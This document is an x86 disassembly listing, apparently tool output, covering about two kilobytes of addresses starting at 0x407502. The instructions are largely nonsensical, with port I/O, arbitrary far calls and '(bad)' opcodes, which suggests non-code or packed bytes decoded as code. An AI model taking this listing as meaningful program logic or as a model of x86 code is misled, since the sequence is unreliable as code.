  407502:	int    0x4d
  407504:	or     BYTE PTR [ebx],0x1b
  407507:	ds sbb al,0xed
  40750a:	addr16 jno 0x407555
  40750d:	and    bl,BYTE PTR [edx-0x1ea745f1]
  407513:	cdq    
  407514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407515:	jle    0x4074f3
  407517:	mov    ecx,0x67408207
  40751c:	mov    ds:0xa1ffe919,eax
  407521:	in     al,dx
  407522:	call   0xd0d8:0x2aea674
  407529:	mov    ch,BYTE PTR [ecx]
  40752b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752c:	sbb    BYTE PTR [eax+0x5baa4fd2],0x2f
  407533:	pop    edi
  407534:	mov    dl,0xf4
  407536:	mov    DWORD PTR [eax],edx
  407538:	ins    DWORD PTR es:[edi],dx
  407539:	in     al,0xa5
  40753b:	fcmovnbe st,st(2)
  40753d:	or     esi,DWORD PTR [esi+0x6f]
  407540:	adc    BYTE PTR [edx+edx*8+0x38],0x90
  407545:	mov    ds:0x85a869a,eax
  40754a:	add    ah,dh
  40754c:	and    al,0x9c
  40754e:	sbb    BYTE PTR [ebx+0x1eb9d5e5],dh
  407554:	mov    bl,0x7a
  407556:	mov    dl,0x7c
  407558:	leave  
  407559:	fs dec edx
  40755b:	dec    ebx
  40755c:	loopne 0x40750a
  40755e:	mov    al,ds:0x530bb3aa
  407563:	in     eax,0xb1
  407565:	shr    DWORD PTR [edi+ebx*8-0x4bebf461],cl
  40756c:	aas    
  40756d:	imul   edx,DWORD PTR [ecx-0x51],0x969a5d3b
  407574:	xchg   ebp,eax
  407575:	pop    ds
  407576:	or     al,0x7
  407578:	repz jp 0x4075bc
  40757b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757c:	dec    esp
  40757d:	out    0xd8,al
  40757f:	test   al,0x7e
  407581:	mov    ecx,0x576ab552
  407586:	call   0x3423:0xb0fefdeb
  40758d:	xchg   BYTE PTR [ebp-0x59],ch
  407590:	adc    BYTE PTR [edx],bh
  407592:	lds    eax,FWORD PTR [edi-0x8]
  407595:	in     eax,dx
  407596:	add    BYTE PTR [eax-0x4e],0x28
  40759a:	add    eax,0x2e6bc8c2
  40759f:	in     eax,0x59
  4075a1:	or     eax,DWORD PTR [edx+edx*8+0x3ed48d7e]
  4075a8:	ret    0x9abb
  4075ab:	xor    DWORD PTR [ebp-0x2a428264],ebx
  4075b1:	clc    
  4075b2:	leave  
  4075b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b4:	cmp    DWORD PTR [ebx+0x25a66198],esi
  4075ba:	int3   
  4075bb:	enter  0xc2b2,0xbc
  4075bf:	aas    
  4075c0:	jne    0x4075e8
  4075c2:	dec    ebp
  4075c3:	cs jbe 0x4075d1
  4075c6:	loope  0x4075a1
  4075c8:	mov    ecx,0x8e9767aa
  4075cd:	pop    ecx
  4075ce:	call   0xd8d5:0x218d7f2c
  4075d5:	es adc dl,bh
  4075d8:	mov    esp,0x4fa49e0b
  4075dd:	xchg   ch,bh
  4075df:	fdivp  st(4),st
  4075e1:	add    edx,DWORD PTR [ecx+eax*2+0x47c318b9]
  4075e8:	je     0x4075eb
  4075ea:	mov    al,ds:0x970bc8e8
  4075ef:	cvtdq2ps xmm4,XMMWORD PTR [edi-0x7113c352]
  4075f6:	call   0x7b8c:0x618730a9
  4075fd:	inc    ecx
  4075fe:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407600:	jns    0x4075e5
  407602:	outs   dx,BYTE PTR ds:[esi]
  407603:	inc    ebp
  407604:	stos   BYTE PTR es:[edi],al
  407605:	jl     0x4075d1
  407607:	aaa    
  407608:	mov    eax,edi
  40760a:	test   BYTE PTR [edi-0x50d6aa0a],ah
  407610:	jmp    FWORD PTR [ebx-0xb]
  407613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407614:	push   ds
  407615:	pop    ebp
  407616:	popf   
  407617:	cld    
  407618:	and    ah,cl
  40761a:	cld    
  40761b:	popa   
  40761c:	mov    dl,0x51
  40761e:	add    al,BYTE PTR [esi-0x57]
  407621:	outs   dx,DWORD PTR ds:[esi]
  407622:	add    eax,0x2e09aee0
  407627:	dec    eax
  407628:	inc    edi
  407629:	add    al,0x2c
  40762b:	inc    edx
  40762c:	sar    BYTE PTR [ebx],cl
  40762e:	or     ah,bl
  407630:	mov    dl,0x18
  407632:	sahf   
  407633:	jmp    0x4d1:0x62a4a56b
  40763a:	cmp    cl,dl
  40763c:	fadd   DWORD PTR [ecx-0x66]
  40763f:	xor    BYTE PTR [edx-0x4d8a53ae],ah
  407645:	dec    esi
  407646:	xchg   BYTE PTR [ebp-0x691d71af],ch
  40764c:	scas   eax,DWORD PTR es:[edi]
  40764d:	or     edx,DWORD PTR [ecx+0x46]
  407650:	dec    ebp
  407651:	fidiv  WORD PTR [eax]
  407653:	cld    
  407654:	fwait
  407655:	add    dh,BYTE PTR [esi-0x2c]
  407658:	mov    dl,0xf3
  40765a:	and    dh,BYTE PTR [ebx-0x2401b73c]
  407660:	fistp  QWORD PTR [ebx+0x53]
  407663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407664:	sbb    eax,0xb57e77e
  407669:	or     dl,BYTE PTR [ebp+0x7f42b13d]
  40766f:	jmp    0x40761d
  407671:	dec    ebx
  407672:	lock dec edi
  407674:	sahf   
  407675:	clc    
  407676:	nop
  407677:	dec    ebp
  407678:	ja     0x407635
  40767a:	in     al,dx
  40767b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767c:	pop    ss
  40767d:	lds    edi,FWORD PTR [di]
  407680:	or     BYTE PTR [ebx],dh
  407682:	sub    al,0x6c
  407684:	(bad)  
  407685:	shl    BYTE PTR [ecx-0x48],1
  407688:	call   0x361b:0x82bbd94e
  40768f:	das    
  407690:	xor    ebp,esp
  407692:	cdq    
  407693:	aad    0x14
  407695:	or     edi,DWORD PTR [edx-0x3311ff9]
  40769b:	push   ebp
  40769c:	in     al,dx
  40769d:	jo     0x40770b
  40769f:	data16 mov dl,0xa2
  4076a2:	xlat   BYTE PTR ds:[ebx]
  4076a3:	aad    0x33
  4076a5:	gs stos BYTE PTR es:[edi],al
  4076a7:	mov    edx,?
  4076a9:	push   cs
  4076aa:	popf   
  4076ab:	bound  edx,QWORD PTR ds:0x176713ef
  4076b1:	stos   DWORD PTR es:[edi],eax
  4076b2:	cmp    DWORD PTR [edx+esi*4-0x2d],edi
  4076b6:	mov    edi,0x2540c951
  4076bb:	xchg   esi,eax
  4076bc:	or     DWORD PTR ds:0xb15a69a5,eax
  4076c2:	jp     0x4076d5
  4076c4:	jnp    0x4076dc
  4076c6:	cdq    
  4076c7:	cdq    
  4076c8:	mov    dl,0xf
  4076ca:	adc    al,0xed
  4076cc:	cld    
  4076cd:	mov    esi,DWORD PTR [edi+0x32]
  4076d0:	cdq    
  4076d1:	add    al,0x16
  4076d3:	mov    ebx,0x937ac54b
  4076d8:	push   ebx
  4076d9:	mov    ds:0xecb266a8,al
  4076de:	outs   dx,DWORD PTR ds:[esi]
  4076df:	mov    bl,ch
  4076e1:	pop    es
  4076e2:	retf   
  4076e3:	lock pop ds
  4076e5:	aaa    
  4076e6:	sub    BYTE PTR [esp+edi*4-0x19],ch
  4076ea:	push   edi
  4076eb:	inc    esi
  4076ec:	out    dx,eax
  4076ed:	mov    esi,DWORD PTR [eax-0x7c]
  4076f0:	sbb    DWORD PTR [ecx+0xb],edi
  4076f3:	iret   
  4076f4:	mov    dl,0xe2
  4076f6:	(bad)  
  4076f7:	lods   eax,DWORD PTR ds:[esi]
  4076f8:	iret   
  4076f9:	sbb    al,0xd8
  4076fb:	std    
  4076fc:	sub    DWORD PTR [ebx],ecx
  4076fe:	or     eax,0x1eca72c9
  407703:	inc    DWORD PTR ds:0x33ee9af1
  407709:	xchg   esp,eax
  40770a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770b:	mov    edi,0xa74c3a8d
  407710:	ins    DWORD PTR es:[edi],dx
  407711:	xchg   DWORD PTR [ebp-0x4253957b],eax
  407717:	mov    al,ds:0x329aafc1
  40771c:	into   
  40771d:	pusha  
  40771e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40771f:	mov    ebp,0xa7f6459a
  407724:	cmc    
  407725:	mov    bl,0x5
  407727:	xchg   edi,eax
  407728:	test   ah,cl
  40772a:	xor    eax,0xa7e7b17a
  40772f:	cdq    
  407730:	push   esi
  407731:	xchg   ecx,eax
  407732:	loopne 0x407762
  407734:	jmp    0x407731
  407736:	inc    esi
  407737:	mov    dl,0xe
  407739:	or     ecx,DWORD PTR [edi-0x6b]
  40773c:	stos   BYTE PTR es:[edi],al
  40773d:	cmp    bh,BYTE PTR [ebp+eiz*2+0x2fd29a68]
  407744:	sbb    BYTE PTR [ebx],cl
  407746:	adc    bh,al
  407748:	out    dx,eax
  407749:	aas    
  40774a:	cmp    eax,0x7e0b6ed1
  40774f:	inc    eax
  407750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407751:	leave  
  407752:	fidivr WORD PTR [eax]
  407754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407755:	popf   
  407756:	sahf   
  407757:	inc    ebp
  407758:	into   
  407759:	jo     0x407714
  40775b:	ret    0x3632
  40775e:	inc    esp
  40775f:	(bad)  
  407760:	cld    
  407761:	or     eax,DWORD PTR [ecx+0x23]
  407764:	xchg   edi,eax
  407765:	mov    al,ds:0x8d680bb
  40776a:	call   0xf617:0xce728d69
  407771:	or     ecx,ecx
  407773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407774:	test   eax,0xc52ea78
  407779:	test   DWORD PTR [eax],eax
  40777b:	retf   
  40777c:	xchg   edi,eax
  40777d:	(bad)  
  40777e:	jge    0x4077df
  407780:	dec    ecx
  407781:	jbe    0x4077bf
  407783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407784:	add    al,0x2a
  407786:	ret    0x7ad5
  407789:	or     BYTE PTR [ebp-0x4],al
  40778c:	mov    bl,0xfe
  40778e:	jp     0x4077b9
  407790:	popf   
  407791:	shl    BYTE PTR [ecx+0x7a],cl
  407794:	cmp    BYTE PTR [ebx+0x66],0xa6
  407798:	sub    DWORD PTR [esi+0x2c],edi
  40779b:	and    DWORD PTR [edi-0x33b11197],esp
  4077a1:	out    0x87,eax
  4077a3:	mov    edi,0x5d9a225a
  4077a8:	jbe    0x407810
  4077aa:	call   0x2544dffb
  4077af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077b0:	xchg   ebx,eax
  4077b1:	jnp    0x407751
  4077b3:	jl     0x407818
  4077b5:	cmp    ebp,DWORD PTR [esi-0x55]
  4077b8:	inc    eax
  4077b9:	mov    esi,0xea0b529a
  4077be:	cmp    al,cl
  4077c0:	cdq    
  4077c1:	test   DWORD PTR [eax],esp
  4077c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c4:	jo     0x407790
  4077c6:	jg     0x4077bc
  4077c8:	out    0x81,eax
  4077ca:	xor    eax,0xcb56b3b7
  4077cf:	shl    BYTE PTR [ebx],cl
  4077d1:	mov    eax,ds:0xe9d39d62
  4077d6:	jbe    0x4077f1
  4077d8:	cmp    DWORD PTR [ebx],ecx
  4077da:	ret    0xa99a
  4077dd:	and    BYTE PTR [ebx-0x65fe7d82],dh
  4077e3:	loope  0x407844
  4077e5:	dec    edx
  4077e6:	dec    esp
  4077e7:	fisubr WORD PTR [ecx-0x29]
  4077ea:	loopne 0x407793
  4077ec:	adc    ecx,edi
  4077ee:	sti    
  4077ef:	push   ecx
  4077f0:	jp     0x407805
  4077f2:	pushf  
  4077f3:	lea    ecx,[ebp+0x7d89ce5a]
  4077f9:	mov    ah,0xbd
  4077fb:	jae    0x407866
  4077fd:	or     edx,DWORD PTR [eax+0x25cdd0a6]
  407803:	inc    esp
  407804:	mov    esi,DWORD PTR [edi+0x72]
  407807:	daa    
  407808:	jnp    0x407832
  40780a:	mov    ch,0x62
  40780c:	mov    eax,ds:0x3ab824ba
  407811:	loopne 0x407831
  407813:	addr16 loop 0x4077f8
  407816:	xchg   ebx,eax
  407817:	jle    0x4077c3
  407819:	mov    dl,0x9a
  40781b:	dec    ebp
  40781c:	and    al,0x9a
  40781e:	push   esp
  40781f:	mov    ebx,0xef4d1dd0
  407824:	cmp    ch,BYTE PTR [edx+0x53165395]
  40782a:	sbb    ah,cl
  40782c:	adc    esi,DWORD PTR [edi+0x4c]
  40782f:	ret    0xbdb2
  407832:	fs sbb eax,0x623a79f7
  407838:	pop    edi
  407839:	or     esp,DWORD PTR [edi]
  40783b:	adc    al,0x34
  40783d:	push   cs
  40783e:	adc    eax,ebx
  407840:	scas   al,BYTE PTR es:[edi]
  407841:	loop   0x4077dd
  407843:	adc    dl,BYTE PTR [ecx+edx*4-0x4c]
  407847:	xchg   esp,eax
  407848:	jae    0x407867
  40784a:	shl    DWORD PTR [esi-0xd8e4ff2],0x57
  407851:	cmc    
  407852:	dec    edx
  407853:	push   0x52
  407855:	neg    ah
  407857:	push   ebx
  407858:	add    ah,BYTE PTR [edi-0x47769c66]
  40785e:	out    0x43,al
  407860:	xchg   esi,eax
  407861:	sar    edi,0xa7
  407864:	popa   
  407865:	daa    
  407866:	pop    di
  407868:	mov    edx,DWORD PTR [esp+ecx*4+0x3e]
  40786c:	mov    dl,0x1e
  40786e:	sbb    ebx,DWORD PTR [ebx+edi*1-0x57221322]
  407875:	or     ecx,DWORD PTR [ecx-0x58]
  407878:	jmp    0x40789b
  40787a:	push   edi
  40787b:	adc    edi,esp
  40787d:	push   ecx
  40787e:	loope  0x4078f9
  407880:	mov    ebp,0x631d55a4
  407885:	jmp    0x407899
  407887:	or     al,0x72
  407889:	ret    
  40788a:	xor    al,0xa7
  40788c:	or     eax,0x4a3ecb20
  407891:	iret   
  407892:	nop
  407893:	ja     0x407861
  407895:	jnp    0x407831
  407897:	add    cl,BYTE PTR [edx-0x655158be]
  40789d:	xchg   DWORD PTR [esi-0x1],edi
  4078a0:	and    ecx,DWORD PTR [esi-0x4bb46866]
  4078a6:	adc    BYTE PTR [ecx+ecx*1],dl
  4078a9:	bound  ebp,QWORD PTR [edx+0x468bf242]
  4078af:	xor    BYTE PTR [eax+0x1bcdb40c],0x89
  4078b6:	adc    eax,DWORD PTR [edi+0x4b]
  4078b9:	mov    ds:0x6bb20669,eax
  4078be:	stc    
  4078bf:	mov    WORD PTR [edi],fs
  4078c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c2:	inc    DWORD PTR [ebx+0x42]
  4078c5:	or     ebp,DWORD PTR [esi+0x36]
  4078c8:	std    
  4078c9:	cdq    
  4078ca:	mov    edi,0x9bd29c96
  4078cf:	dec    ebp
  4078d0:	mov    ebx,0xf5312251
  4078d5:	inc    ecx
  4078d6:	push   0x7d
  4078d8:	cmp    eax,0x8787ae16
  4078dd:	dec    ebx
  4078de:	pop    ds
  4078df:	out    0x1c,eax
  4078e1:	push   0x21
  4078e3:	fnsave [edx+0x2e2bd41b]
  4078e9:	out    0x8e,al
  4078eb:	mov    esi,0x5cd00ba4
  4078f0:	xchg   esi,eax
  4078f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f2:	retf   
  4078f3:	lea    edx,[esi+eiz*2+0x10e0ab9a]
  4078fa:	cdq    
  4078fb:	call   0xa72de91a
  407900:	add    ah,BYTE PTR [eax]
  407902:	mov    eax,0xac7f6556
  407907:	push   edi
  407908:	push   esi
  407909:	pop    es
  40790a:	sahf   
  40790b:	aaa    
  40790c:	loopne 0x407977
  40790e:	lock fisttp WORD PTR ds:0x676c9ecb
  407915:	dec    ebx
  407916:	call   0x4ddd2be9
  40791b:	jl     0x407963
  40791d:	mov    eax,0xbef8cfb
  407922:	adc    eax,0x65b5d23
  407927:	imul   esi,DWORD PTR [ecx+0x5e069d9b],0xffffffda
  40792e:	xor    BYTE PTR [edx+0x74dfc072],dl
  407934:	xchg   esp,eax
  407935:	or     ebx,DWORD PTR [ebp+0xed20f79]
  40793b:	data16 jno 0x4079b8
  40793e:	call   0x4e87:0x7133f64e
  407945:	xchg   edx,eax
  407946:	or     DWORD PTR [edi+0x37874032],esp
  40794c:	arpl   WORD PTR [ecx+esi*4+0x66],cx
  407950:	mov    dl,0x3f
  407952:	(bad)  [eax+0x305813b0]
  407958:	aas    
  407959:	or     al,0x1c
  40795b:	not    BYTE PTR [edi]
  40795d:	enter  0xe75d,0x5f
  407961:	jnp    0x4078e7
  407963:	imul   esi,DWORD PTR [edx+0x4bae9a3],0xffffff89
  40796a:	add    esp,esp
  40796c:	dec    eax
  40796d:	or     bl,BYTE PTR [eax-0x26]
  407970:	pop    eax
  407971:	push   edi
  407972:	outs   dx,BYTE PTR ds:[esi]
  407973:	out    0x6d,eax
  407975:	jecxz  0x40798b
  407977:	fdiv   DWORD PTR [edx-0x2db73534]
  40797d:	(bad)  
  40797e:	sahf   
  40797f:	or     al,0x77
  407981:	or     esi,ecx
  407983:	mov    edx,0x6bab1596
  407988:	pusha  
  407989:	aaa    
  40798a:	call   0xf9e:0x5c8c9bf4
  407991:	mov    esi,0x5714a71c
  407996:	in     al,0x41
  407998:	sbb    esp,DWORD PTR [edi]
  40799a:	into   
  40799b:	call   0xe5066a53
  4079a0:	inc    ecx
  4079a1:	mov    ch,dl
  4079a3:	retf   
  4079a4:	(bad)  
  4079a5:	test   DWORD PTR [eax],0x1aab459f
  4079ab:	js     0x407971
  4079ad:	je     0x4079f8
  4079af:	sub    esp,DWORD PTR [esi+0x6dd7653b]
  4079b5:	fs call 0x2bc1:0x4147ec89
  4079bd:	xlat   BYTE PTR ds:[ebx]
  4079be:	mov    ds:0xb37281a7,eax
  4079c3:	mov    esp,0x87383048
  4079c8:	mov    es,WORD PTR [eax-0x34d1db7d]
  4079ce:	dec    edx
  4079cf:	xor    bl,0xe3
  4079d2:	shl    DWORD PTR [ecx-0x4fe288aa],cl
  4079d8:	call   0x27e84e95
  4079dd:	fs jmp 0x95c2c494
  4079e3:	adc    BYTE PTR [edi-0x10],dh
  4079e6:	adc    cl,0x5e
  4079e9:	out    dx,eax
  4079ea:	mov    eax,ds:0x37753350
  4079ef:	idiv   DWORD PTR [ecx-0x28783aa9]
  4079f5:	fadd   DWORD PTR [edx]
  4079f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079f8:	mov    ebp,0xf6f55117
  4079fd:	jmp    0x4079f7
  4079ff:	xchg   BYTE PTR [ecx-0x43582346],dh
  407a05:	pop    esi
  407a06:	inc    edi
  407a07:	mov    ds:0x5e9d84c,al
  407a0c:	mov    dl,0x52
  407a0e:	fldenv [ebx-0x2f]
  407a11:	mov    esp,0xbba8bab
  407a16:	fisttp WORD PTR [edx+eiz*8-0x2d]
  407a1a:	jns    0x407a55
  407a1c:	pop    es
  407a1d:	jae    0x4079b9
  407a1f:	ds push edx
  407a21:	pop    ss
  407a22:	mov    eax,0xbd38feea
  407a27:	out    dx,eax
  407a28:	push   esi
  407a29:	jno    0x4079c8
  407a2b:	test   al,0x3e
  407a2d:	and    eax,0x9b50d7dc
  407a32:	shl    dl,0xb2
  407a35:	sub    eax,0x1e2e7ee8
  407a3a:	add    ah,bl
  407a3c:	xchg   ebp,eax
  407a3d:	xor    al,BYTE PTR [ecx]
  407a3f:	imul   esi,DWORD PTR [edx-0x3df037ea],0xae89fe3f
  407a49:	jge    0x407abd
  407a4b:	jne    0x4079db
  407a4d:	mov    WORD PTR [edx-0x5d],es
  407a50:	repz inc esp
  407a52:	mov    bh,BYTE PTR [esi-0x5f5ae798]
  407a58:	xor    DWORD PTR [edi-0x64fe4446],eax
  407a5e:	lods   eax,DWORD PTR ss:[esi]
  407a60:	or     eax,0x81889a2f
  407a65:	xor    al,dl
  407a67:	cmp    edx,ebx
  407a69:	out    0x42,eax
  407a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6c:	jo     0x407ad7
  407a6e:	cmp    ebp,DWORD PTR [edi]
  407a70:	lds    edx,FWORD PTR [eax]
  407a72:	xor    DWORD PTR [edx-0x7462abac],ebp
  407a78:	fist   WORD PTR [ecx+esi*2-0x2ce92d0f]
  407a7f:	rol    DWORD PTR [eax],0xc
  407a82:	mov    es,WORD PTR [edi]
  407a84:	mov    ss,WORD PTR [ecx+0x69132770]
  407a8a:	sbb    BYTE PTR [esi-0x45db3b4e],0xf9
  407a91:	or     al,0xe6
  407a93:	sub    al,0x6e
  407a95:	or     eax,DWORD PTR ds:0xfef9358
  407a9b:	fisub  DWORD PTR ds:0xaafba695
  407aa1:	mov    ebp,DWORD PTR [ebx]
  407aa3:	call   0xb98:0x63e207b7
  407aaa:	pop    es
  407aab:	bound  edi,QWORD PTR [ecx+0x70c4ac20]
  407ab1:	xor    ebx,DWORD PTR [edx-0x36a35c35]
  407ab7:	inc    ecx
  407ab8:	std    
  407ab9:	fs inc esp
  407abb:	dec    esi
  407abc:	push   esi
  407abd:	call   0xa717:0x93c9835a
  407ac4:	test   eax,0x2be0e6de
  407ac9:	loope  0x407a65
  407acb:	adc    BYTE PTR [esi+0x22da1f23],al
  407ad1:	mov    dl,0x1b
  407ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad4:	push   cs
  407ad5:	sbb    edx,ebp
  407ad7:	mov    ss,WORD PTR [edi]
  407ad9:	mov    WORD PTR ds:0x12058e8b,ss
  407adf:	adc    DWORD PTR [esi+0x6b],edx
  407ae2:	je     0x407b42
  407ae4:	enter  0xb437,0xa7
  407ae8:	dec    edx
  407ae9:	jp     0x407a70
  407aeb:	mov    bl,0x7e
  407aed:	dec    esp
  407aee:	sub    BYTE PTR [eax-0x55c0904e],0x76
  407af5:	mov    fs,WORD PTR [esi-0x4c]
  407af8:	lock or ebx,DWORD PTR [esi+0x53e3fa07]
  407aff:	push   edi
  407b00:	or     DWORD PTR [edi-0x65],0x9548986d
  407b07:	inc    esp
  407b08:	dec    ebp
  407b09:	nop
  407b0a:	dec    edx
  407b0b:	mov    al,ds:0x1c880c30
  407b10:	inc    eax
  407b11:	pop    ecx
  407b12:	inc    BYTE PTR [edi+0x1]
  407b15:	cmp    DWORD PTR [edx-0x116c779b],edx
  407b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1c:	push   ss
  407b1d:	inc    edi
  407b1e:	mov    ds:0x3660ca0,eax
  407b23:	pop    ds
  407b24:	repnz out dx,eax
  407b26:	in     al,0xa7
  407b28:	fs dec esp
  407b2a:	push   es
  407b2b:	and    esi,ebx
  407b2d:	sbb    ecx,DWORD PTR [ecx+0x7d]
  407b30:	mov    dl,0x60
  407b32:	fistp  DWORD PTR [eax]
  407b34:	jecxz  0x407bb5
  407b36:	ins    DWORD PTR es:[edi],dx
  407b37:	sti    
  407b38:	mov    WORD PTR [ebx],cs
  407b3a:	fcom   QWORD PTR [eax+0x733263ff]
  407b40:	and    eax,0x1ba1a0f4
  407b45:	add    cl,BYTE PTR [ecx-0xef0e99c]
  407b4b:	sub    bl,BYTE PTR [ebx+ecx*8]
  407b4e:	ins    DWORD PTR es:[edi],dx
  407b4f:	out    dx,eax
  407b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b51:	sub    dl,dl
  407b53:	test   BYTE PTR [ebx+0xc],cl
  407b56:	subps  xmm4,XMMWORD PTR [edi-0x74]
  407b5a:	stos   BYTE PTR es:[edi],al
  407b5b:	pop    ecx
  407b5c:	lock inc esi
  407b5e:	mov    dl,0xa7
  407b60:	jl     0x407b7c
  407b62:	push   ebx
  407b63:	std    
  407b64:	mov    ebp,0x56113b7b
  407b69:	adc    DWORD PTR [edx+0xf8a44a5],ebx
  407b6f:	xchg   bl,dh
  407b71:	(bad)  
  407b72:	sbb    eax,0x310bd2d7
  407b77:	int3   
  407b78:	loopne 0x407b2a
  407b7a:	adc    cl,BYTE PTR [edx+0x76]
  407b7d:	push   eax
  407b7e:	call   0x578a:0xced078f2
  407b85:	xor    esi,ebx
  407b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b88:	jno    0x407bee
  407b8a:	sub    DWORD PTR [ebx+0x27],ebx
  407b8d:	div    BYTE PTR ds:0xfeb2d9
  407b93:	push   0x1b31e0b7
  407b98:	(bad)  
  407b99:	or     edi,ebp
  407b9b:	pop    esp
  407b9c:	das    
  407b9d:	daa    
  407b9e:	in     eax,0xcc
  407ba0:	mov    edi,0xced39a8d
  407ba5:	pop    eax
  407ba6:	xchg   esi,eax
  407ba7:	addr16 enter 0x56ac,0xa7
  407bac:	mov    ah,0x1f
  407bae:	mov    edi,0x6d52a893
  407bb3:	jo     0x407b66
  407bb5:	retf   0x547b
  407bb8:	add    eax,0x780f7141
  407bbd:	or     al,0x2e
  407bbf:	popf   
  407bc0:	pop    ebp
  407bc1:	aaa    
  407bc2:	call   0x5797:0x8f57677
  407bc9:	xchg   edi,eax
  407bca:	call   0x77e7:0xf6b7c23e
  407bd1:	fist   WORD PTR [edi+0x1c8a88a7]
  407bd7:	loopne 0x407c18
  407bd9:	imul   ebx,DWORD PTR [ebp+0x93fb2b2],0x3a9ce90
  407be3:	icebp  
  407be4:	pop    ebp
  407be5:	or     edx,edi
  407be7:	aas    
  407be8:	push   edi
  407be9:	in     al,dx
  407bea:	xor    esi,DWORD PTR ds:0x2a7ec01a
  407bf0:	or     bl,ah
  407bf2:	in     al,dx
  407bf3:	sub    al,0xb2
  407bf5:	mov    al,ds:0xa1d2565
  407bfa:	jnp    0x407bb8
  407bfc:	mov    ecx,0xf61a0f0b
  407c01:	dec    ecx
  407c02:	retf   
  407c03:	sbb    BYTE PTR [eax+edi*8+0x60],0x0
  407c08:	lods   eax,DWORD PTR ds:[esi]
  407c09:	and    bl,ah
  407c0b:	js     0x407c7f
  407c0d:	xor    DWORD PTR [edx+0x34],edi
  407c10:	(bad)  
  407c11:	xchg   ebx,eax
  407c12:	dec    eax
  407c13:	mov    DWORD PTR [esi-0x7374a2c7],edi
  407c19:	or     edx,DWORD PTR [ecx-0x4497cdf0]
  407c1f:	fdiv   QWORD PTR [edx+0x3e15392e]
  407c25:	add    eax,0xb13650c
  407c2a:	mov    cl,cl
  407c2c:	add    al,0x4f
  407c2e:	push   esi
  407c2f:	lods   al,BYTE PTR ds:[esi]
  407c30:	mov    edx,0x130a70f
  407c35:	or     ebp,DWORD PTR [eax-0x198c166a]
  407c3b:	test   al,0x24
  407c3d:	or     edx,DWORD PTR [eax]
  407c3f:	cmp    dl,al
  407c41:	fs (bad) 
  407c43:	jmp    0x94d:0x9e9a8ffb
  407c4a:	mov    eax,ds:0xf01a3d39
  407c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c50:	int3   
  407c51:	cli    
  407c52:	scas   eax,DWORD PTR es:[edi]
  407c53:	(bad)  
  407c54:	fwait
  407c55:	xchg   esi,eax
  407c56:	idiv   DWORD PTR [ecx-0x2865d9ae]
  407c5c:	leave  
  407c5d:	mov    esi,0x3675c696
  407c62:	dec    esp
  407c63:	jmp    0x407bf0
  407c65:	xchg   ecx,eax
  407c66:	call   0xb78e:0x2a663302
  407c6d:	mov    esp,0x8e2cc19a
  407c72:	mov    eax,ds:0x896e13d6
  407c77:	scas   al,BYTE PTR es:[edi]
  407c78:	xor    al,0x84
  407c7a:	scas   eax,DWORD PTR es:[edi]
  407c7b:	push   ebx
  407c7c:	xor    DWORD PTR [ebx],esp
  407c7e:	mov    dl,0x67
  407c80:	xor    dl,BYTE PTR [ebx+edx*1+0x1763b28b]
  407c87:	(bad)  
  407c88:	mov    al,0xae
  407c8a:	mov    ch,0x12
  407c8c:	xor    dl,BYTE PTR [esi]
  407c8e:	cmp    edx,ebx
  407c90:	mov    edx,DWORD PTR fs:[eax]
  407c93:	in     eax,dx
  407c94:	push   eax
  407c95:	xchg   ebp,eax
  407c96:	mov    ebx,0xc733b014
  407c9b:	jp     0x407c96
  407c9d:	ins    DWORD PTR es:[edi],dx
  407c9e:	das    
  407c9f:	out    0xdb,eax
  407ca1:	adc    dh,BYTE PTR [esi-0x65b56d15]
  407ca7:	pusha  
  407ca8:	xchg   ebx,eax
  407ca9:	adc    al,0x1f
  407cab:	cmp    ebp,esi
  407cad:	ds call 0xa1d2:0x90cbba02
  407cb5:	jmp    0x407d06
  407cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb8:	aam    0xdc
  407cba:	daa    
  407cbb:	out    dx,al
  407cbc:	lock rol DWORD PTR [esi-0x50],0xb2
  407cc1:	or     al,0x2c
  407cc3:	addr16 push eax
  407cc5:	fdiv   DWORD PTR [eax-0x38f4064d]
  407ccb:	push   ds
  407ccc:	into   
  407ccd:	jl     0x407cc6
  407ccf:	add    bl,0xcd
  407cd2:	mov    dh,0xe9
  407cd4:	inc    edx
  407cd5:	ret    
  407cd6:	call   0x69bb:0x33687835
  407cdd:	or     eax,DWORD PTR [eax-0x52]
  407ce0:	sub    eax,0x36cc47f8
  407ce5:	mov    ebx,DWORD PTR [edx+0x2bddf4b3]
  407ceb:	pusha  
  407cec:	or     al,0x59
  407cee:	mov    ch,0xa0
  407cf0:	push   0xd1ee550
  407cf5:	sbb    edx,DWORD PTR [esi]
  407cf7:	cmp    al,0xf6
  407cf9:	pop    esi
  407cfa:	call   0xf509:0x942f9a38
  407d01:	cld    
  407d02:	in     al,0x4f
  407d04:	jge    0x407d1e
  407d06:	mov    esp,0x7e0b10f5
  407d0b:	pop    edx
  407d0c:	push   esi
  407d0d:	or     BYTE PTR [ebx+ecx*4-0x4e],ch
